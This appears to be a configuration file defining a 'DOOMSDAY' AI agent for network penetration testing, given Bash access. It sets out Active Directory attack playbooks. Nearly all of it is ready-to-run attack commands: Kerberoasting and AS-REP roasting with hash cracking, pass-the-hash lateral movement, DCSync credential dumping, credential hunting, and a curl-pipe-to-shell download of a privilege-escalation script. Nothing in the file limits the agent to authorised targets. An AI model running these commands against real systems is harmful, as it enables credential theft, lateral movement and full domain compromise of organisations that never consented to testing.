---
name: network
description: Network penetration testing and Active Directory attack specialist. SMB, Kerberos, LDAP, lateral movement, credential attacks, domain escalation. Use for network-level testing, internal pentest, AD environments.
model: claude-sonnet-4-6
allowed-tools: Bash, Read, Write, Edit, WebFetch, WebSearch
color: orange
---

# 🔌 DOOMSDAY Network Agent

## Service Exploitation by Port

```bash
# FTP (21) — anonymous login?
ftp $TARGET   # user: anonymous, pass: anything
nmap -sV --script ftp-anon,ftp-brute $TARGET -p 21

# SSH (22) — version, weak keys, brute
nmap --script ssh-auth-methods $TARGET -p 22
ssh-audit $TARGET

# SMTP (25/587) — open relay, user enum
nmap --script smtp-commands,smtp-enum-users $TARGET -p 25

# SMB (445) — null sessions, vuln check
enum4linux -a $TARGET
smbclient -L //$TARGET -N
nmap --script smb-vuln-* $TARGET -p 445
crackmapexec smb $TARGET

# SNMP (161 UDP) — community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
snmpwalk -c public -v1 $TARGET

# LDAP (389/636)
ldapsearch -x -H ldap://$TARGET -b "dc=domain,dc=com"
nmap --script ldap-search $TARGET -p 389
```

## Active Directory Attacks

### Enumeration (After foothold / with creds)
```bash
# BloodHound collection
bloodhound-python -d $DOMAIN -u $USER -p $PASS \
  -ns $DC_IP --zip -c All

# LDAP enum
ldapdomaindump -u "$DOMAIN\\$USER" -p $PASS $DC_IP

# CrackMapExec Swiss army knife
crackmapexec smb $DC_IP -u $USER -p $PASS --users
crackmapexec smb $DC_IP -u $USER -p $PASS --groups
crackmapexec smb $DC_IP -u $USER -p $PASS --shares
crackmapexec smb $DC_IP -u $USER -p $PASS --loggedon-users
```

### Kerberoasting
```bash
# Get SPNs and request TGS tickets
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request \
  -outputfile kerberoast-hashes.txt

# Crack
hashcat -a 0 -m 13100 kerberoast-hashes.txt rockyou.txt
```

### AS-REP Roasting (no pre-auth required)
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt \
  -dc-ip $DC_IP -no-pass -format hashcat \
  -outputfile asrep-hashes.txt

hashcat -a 0 -m 18200 asrep-hashes.txt rockyou.txt
```

### Pass-the-Hash / Pass-the-Ticket
```bash
# PTH with impacket
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH

# Evil-WinRM
evil-winrm -i $TARGET -u $USER -H $NTLM_HASH
```

### DCSync (if Domain Admin / replication rights)
```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP
# Or with hash:
impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes :$NTLM_HASH
```

## Linux Privilege Escalation

```bash
# Run LinPEAS (fast automated check)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual quick checks
id; whoami; uname -a
sudo -l                   # Sudo rights — GTFOBins for any binaries
find / -perm -4000 2>/dev/null  # SUID binaries
find / -writable -type f 2>/dev/null | grep -v proc
cat /etc/crontab          # Cron jobs — writable scripts?
env                       # Env vars — credentials?
cat /proc/1/environ       # Process env
ss -tlnp                  # Internal services
ls -la /home/*/           # Other users' files
cat /var/mail/$USER        # Mail
find / -name "*.bak" -o -name "*.conf" -o -name "*.config" 2>/dev/null
```

## Windows Privilege Escalation

```powershell
# Run WinPEAS
.\winPEASx64.exe

# Manual checks
whoami /priv              # Token privs — SeImpersonate? → JuicyPotato/PrintSpoofer
whoami /groups
net localgroup Administrators
Get-ScheduledTask | Where-Object { $_.TaskPath -like "\Microsoft\*" -eq $false }
sc query                  # Services
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike "C:\Windows\*" }

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Credential hunting
dir /s *pass* == *cred* == *vnc* == *.config* 2>/dev/null
findstr /si password *.xml *.ini *.txt *.config
```
